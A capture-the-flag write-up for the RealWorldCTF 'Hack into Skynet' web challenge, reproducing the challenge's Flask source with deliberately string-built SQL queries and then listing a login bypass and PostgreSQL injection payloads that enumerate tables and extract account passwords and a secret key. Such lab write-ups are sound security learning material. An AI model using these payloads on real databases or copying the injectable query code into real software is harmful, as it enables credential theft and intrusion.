---  
title: "RealWorldCTF - Hack into Skynet [Web] (81 solves)"  
author: "c7c3r0"  
description: "Hack into skynet to save the world, which way do you prefer?"  
date: 2022-01-23  
---

## Description  
Hack into skynet to save the world, which way do you prefer?

## Code Review  
```python  
import flask  
import psycopg2  
import datetime  
import hashlib  
from skynet import Skynet #Skynet Code is not provided and is unnecessary in
order to complete the challenge

app = flask.Flask(__name__, static_url_path='')  
skynet = Skynet()

def skynet_detect(): #Skynet Attack Detection System  
   req = {  
       'method': flask.request.method,  
       'path': flask.request.full_path,  
       'host': flask.request.headers.get('host'),  
       'content_type': flask.request.headers.get('content-type'),  
       'useragent': flask.request.headers.get('user-agent'),  
       'referer': flask.request.headers.get('referer'),  
       'cookie': flask.request.headers.get('cookie'), #If you can get a sessionId you will gain initial system access  
       'body': str(flask.request.get_data()),  
   }  
   _, result = skynet.classify(req)  
   return result and result['attack'] #On trying dangerous actions you are
denoted an attacker from the system (403 You are not Permitted to Access this
Page)

@app.route('/static/<path:path>')  
def static_files(path):  
   return flask.send_from_directory('static', path)

@app.route('/', methods=['GET', 'POST'])  
def do_query():  
   if skynet_detect():  
       return flask.abort(403) #Skynet is being attacked (User is presented with a 403 HTTP Status Code)

   if not query_login_state():  
       response = flask.make_response('No login, redirecting', 302) #No Login Redirecting  
       response.location = flask.escape('/login')  
       return response

   if flask.request.method == 'GET':  
       return flask.send_from_directory('', 'index.html') #Show index.html (index.html was never shown in the webpage URL and never used.)  
   elif flask.request.method == 'POST':  
       kt = query_kill_time()  
       if kt:  
           result = kt  
       else:  
           result = ''  
       return flask.render_template('index.html', result=result) #The result of attacking Skynet (Take a look at line #38.)  
   else:  
       return flask.abort(400)

@app.route('/login', methods=['GET', 'POST'])  
def do_login():  
   if skynet_detect():  
       return flask.abort(403)

   if flask.request.method == 'GET':  
       return flask.send_from_directory('static', 'login.html')  
   elif flask.request.method == 'POST':  
       if not query_login_attempt():  
           return flask.send_from_directory('static', 'login.html')  
       else:  
           session = create_session()  
           response = flask.make_response('Login success', 302) #We needed to bypass the login system  
           response.set_cookie('SessionId', session) #We needed a valid sessionId. Was provided after success login bypass.  
           response.location = flask.escape('/')  
           return response  
   else:  
       return flask.abort(400)

def query_login_state():  
   sid = flask.request.cookies.get('SessionId', '')  
   if not sid:  
       return False

   now = datetime.datetime.now()  
   with psycopg2.connect(  
           host="challenge-db",  
           database="ctf", #databse  
           user="ctf", #username  
           password="ctf") as conn: #password  
       cursor = conn.cursor()  
       cursor.execute("SELECT sessionid"  
          "  FROM login_session"  
          "  WHERE sessionid = %s"  
          "    AND valid_since <= %s"  
          "    AND valid_until >= %s"  
          "", (sid, now, now))  
       data = [r for r in cursor.fetchall()]  
       return bool(data)

def query_login_attempt():  
   username = flask.request.form.get('username', '')  
   password = flask.request.form.get('password', '')  
   if not username and not password: #username=&password=ctf(login bypass)  
       return False

   sql = ("SELECT id, account"  
          "  FROM target_credentials"  
          "  WHERE password = '{}'").format(hashlib.md5(password.encode()).hexdigest())  
   user = sql_exec(sql)  
   name = user[0][1] if user and user[0] and user[0][1] else ''  
   return name == username

def create_session(): #valid sessionId duration  
   valid_since = datetime.datetime.now()  
   valid_until = datetime.datetime.now() + datetime.timedelta(days=1)  
   sessionid =
hashlib.md5((str(valid_since)+str(valid_until)+str(datetime.datetime.now())).encode()).hexdigest()

   sql_exec_update(("INSERT INTO login_session (sessionid, valid_since,
valid_until)"  
          "  VALUES ('{}', '{}', '{}')").format(sessionid, valid_since, valid_until))  
   return sessionid

def query_kill_time():  
   name = flask.request.form.get('name', '')  
   if not name:  
       return None

   sql = ("SELECT name, born"  
          "  FROM target"  
          "  WHERE age > 0"  
          "    AND name = '{}'").format(name) ##SQLi AV.This is where magic happens.  
   nb = sql_exec(sql) #On a dangerous sql statement, abort operation.  
   if not nb:  
       return None  
   return '{}: {}'.format(*nb[0])

def sql_exec(stmt):  
   data = list()  
   try:  
       with psycopg2.connect(  
               host="challenge-db",  
               database="ctf",  
               user="ctf",  
               password="ctf") as conn:  
           cursor = conn.cursor()  
           cursor.execute(stmt)  
           for row in cursor.fetchall():  
               data.append([col for col in row])  
           cursor.close()  
   except Exception as e:  
       print(e)  
   return data

def sql_exec_update(stmt):  
   data = list()  
   try:  
       with psycopg2.connect(  
               host="challenge-db",  
               database="ctf",  
               user="ctf",  
               password="ctf") as conn:  
           cursor = conn.cursor()  
           cursor.execute(stmt)  
           conn.commit()  
   except Exception as e:  
       print(e)  
   return data

if __name__ == "__main__":  
   app.run(host='0.0.0.0', port=8080)  
```

## Inital Access (Login System Bypass)  
![](https://files.bitwarriors.net/images/skynet/forward.PNG)  
Bypassing the login system with a vanilla sqli injection was impossible.

Looking the source code, bypassing was made possible only after providing the
following from our proxy  
```username=&password=ctf```.

![](https://files.bitwarriors.net/images/skynet/login_bpass.PNG)  
## SQL Injection to reveal the flag  
Trying vanilla payloads proved unsuccessful because this is a Postgres SQL
Database.  
```sql  
||name||  
```

```sql  
'||name LIMIT 3 OFFSET '2  
```

```sql  
SELECT name, born FROM target WHERE age > 0 AND name = ''||name||'' => SELECT
name, born FROM target WHERE age > 0 AND name = name  
```  
```sql  
'; select account, password from target_credentials limit 3 offset '0  
```  
```sql  
'; select name, age from target limit 3 offset '0 ---  
```  
```sql  
'; select table_name, null from information_schema.tables limit 3 offset '0  
```  
```sql  
'; select column_name, null from information_schema.columns where
table_name='target' limit 3 offset '0  
```  
```sql  
'; select column_name, null from information_schema.columns where
table_name='target_credentials' limit 3 offset '4  
```

```sql  
'; select secret_key, null from target_credentials limit 3 offset '0  
```  
![](https://files.bitwarriors.net/images/skynet/flag.PNG)

[challenge](https://files.bitwarriors.net/ctf/RealWorldCTF4/hack_into_skynet_843e0c58997f52e3a65ca9b4c64f2cec.tar.gz)

###### Contributors: `dhmoskfunk` `jimman2003` `un1c0rn`

Original writeup (https://blog.bitwarriors.net/blog/real-world-ctf-hack-into-
skynet-web-81-solves/).